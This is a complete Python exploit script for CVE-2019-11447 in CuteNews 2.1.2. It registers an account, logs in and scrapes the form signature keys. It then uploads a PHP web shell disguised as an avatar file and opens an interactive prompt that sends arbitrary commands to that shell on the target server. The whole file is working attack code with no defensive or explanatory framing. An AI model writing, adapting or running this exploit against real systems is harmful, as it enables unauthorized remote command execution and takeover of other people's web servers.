import argparse
import requests
import random
import sys
import re
import lxml.html
from log_colors import *
import string
requests.packages.urllib3.disable_warnings()

class CVE2019_11447:
    headers = {"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0"}
    
    def __init__(self, url, user, pwd):
        print (LogColors.BLUE + "victim: " + url + "..." + LogColors.ENDC)
        self.url = url
        self.user, self.pwd = user, pwd
        self.session = requests.Session()
        self.filename = ''.join(random.choice(string.ascii_lowercase) for i in range(8))
        self.kstart = 'dGhpc3dlYnNoZWxsb3V0cHV0c3RhcnRzaGVyZQ=='
        self.kend = 'dGhpc3dlYnNoZWxsb3V0cHV0ZW5kc2hlcmU='

    def check_version(self):
        print (LogColors.BLUE + "check version..." + LogColors.ENDC)
        r = self.session.get(self.url.rstrip("/") + "/CuteNews/index.php")
        v = re.findall(".*Powered by .*?>(.*)<\/a> ", r.text)
        if v:
            version = v[0]
            version = version.split()[-1]
            print (LogColors.YELLOW + "version: " + version + "..." + LogColors.ENDC)
            if version != "2.1.2":
                print (LogColors.YELLOW + "version may not be vulnerable :(" + LogColors.ENDC)
        else:
            print (LogColors.RED + "error to detect version :(" + LogColors.ENDC)
    
    def register(self):
        print (LogColors.BLUE + "register: " + self.user + ":" + self.pwd + "..." + LogColors.ENDC)
        data = {
            "action" : "register",
            "regusername" : self.user,
            "regnickname" : self.user,
            "regpassword" : self.pwd,
            "confirm" : self.pwd,
            "regemail" : f"{self.user}@hack.me",
        }
        r = self.session.post(self.url.rstrip("/") + "/CuteNews/index.php?register",
                data = data, allow_redirects = False)
        if r.status_code == 302:
            print (LogColors.GREEN + "registration successfull :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed register new user :(" + LogColors.ENDC)
            sys.exit()

    def login(self):
        print (LogColors.BLUE + "login..." + LogColors.ENDC)
        print (LogColors.YELLOW + self.user + ":" + self.pwd + LogColors.ENDC)
        r = self.session.get(self.url.rstrip("/") + "/CuteNews/index.php")
        data = {
            "username" : self.user,
            "password" : self.pwd,
            "action" : "dologin",
        }
        r = self.session.post(self.url.rstrip("/") + "/CuteNews/index.php", data = data)
        if r.ok:
            if "Please login" in r.text:
                print (LogColors.RED + "invalid username, password" + LogColors.ENDC)
                sys.exit()
            else:
                print (LogColors.GREEN + "successfully login" + LogColors.ENDC)

        else:
            print (LogColors.RED + "error login process..." + LogColors.ENDC)
            sys.exit()
    
    def get_signature_key(self):
        print (LogColors.BLUE + "get signature key..." + LogColors.ENDC)
        r = self.session.get(self.url.rstrip("/") + "/CuteNews/index.php?mod=main&opt=personal")
        self.user = re.search('disabled="disabled" value="(.*?)"', r.text).group(1)
        #sk_sd = re.findall('.*name="__signature_key" value="(.*?)".*name="__signature_dsi" value="(.*?)".*', r.text)
        #signature_key, signature_dsi = sk_sd[0][0], sk_sd[0][1]
        tree = lxml.html.fromstring(r.text)
        signature_key = tree.xpath('.//input[contains(@name, "__signature_key")]/@value')
        signature_dsi = tree.xpath('.//input[contains(@name, "__signature_dsi")]/@value')
        signature_key = signature_key[0]
        signature_dsi = signature_dsi[0]
        data = {
            "mod" : (None, "main"),
            "opt" : (None, "personal"),
            "__signature_key" : (None, signature_key),
            "__signature_dsi" : (None, signature_dsi),
            "editpassword" : (None, ""),
            "confirmpassword" : (None, ""),
            "editnickname" : (None, self.user),
            "more[site]" : (None, ""),
            "more[about]" : (None, ""),
            #"avatar_file" : (self.filename + ".php", open("hack.gif", "rb").read()),
            #"avatar_file" : (self.filename + ".php", open("cat.gif", "rb").read()),
            "avatar_file" : (self.user + ".php", open("cats.php", "rb").read()),
        }
        self.payload_data = data
        print (self.user)
        print (LogColors.YELLOW + "filename for payload: " + self.user + LogColors.ENDC)

    def upload_payload(self):
        self.check_version()
        self.register()
        self.login()
        self.get_signature_key()
        print (LogColors.BLUE + "uploading payload..." + LogColors.ENDC)
        r = self.session.post(
                self.url.rstrip("/") + "/CuteNews/index.php",
                files = self.payload_data)
        if r.ok:
            print (LogColors.YELLOW + "successfully upload avatar..." + LogColors.ENDC)
        else:
            print (LogColors.RED + "upload avatar failed :(" + LogColors.ENDC)
            sys.exit()
        
        avatar_url = self.url.rstrip("/") + "/CuteNews/uploads/avatar_{}_{}.php".format(
                self.user, self.user)
        data = {"cmd" : "ls"}
        r = self.session.post(avatar_url, data = data)

        if r.ok:
            print (LogColors.YELLOW + "have reverse shell!" + LogColors.ENDC)
            print (LogColors.GREEN + "successfully checked, hacked :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "get shell failed :(" + LogColors.ENDC)

    def exploit(self, cmd):
        url = self.url.rstrip("/") + "/CuteNews/uploads/avatar_{}_{}.php".format(
                self.user, self.user)
        data = {"cmd" : cmd}
        r = self.session.post(url, data = data)
        if r.ok:
            output = r.text[r.text.find(self.kstart) + len(self.kstart):r.text.find(self.kend)].strip()
            if output == '':
                print (LogColors.YELLOW + "empty response" + LogColors.ENDC)
            else:
                print (LogColors.YELLOW + output + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed exploitation :(" + LogColors.ENDC)
            sys.exit()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target', required = True, help = "CuteNews url")
    parser.add_argument('-u','--user', required = True, help = "username")
    parser.add_argument('-p','--pswd', required = True, help = "password")
    args = vars(parser.parse_args())
    cve = CVE2019_11447(args['target'], args['user'], args['pswd'])
    cve.upload_payload()
    while True:
        print ("$> ", end = '')
        cmd = input()
        cve.exploit(cmd)
        if cmd.lower() == "exit":
            print (LogColors.YELLOW + "exit. good bye..." + LogColors.ENDC)
            sys.exit()

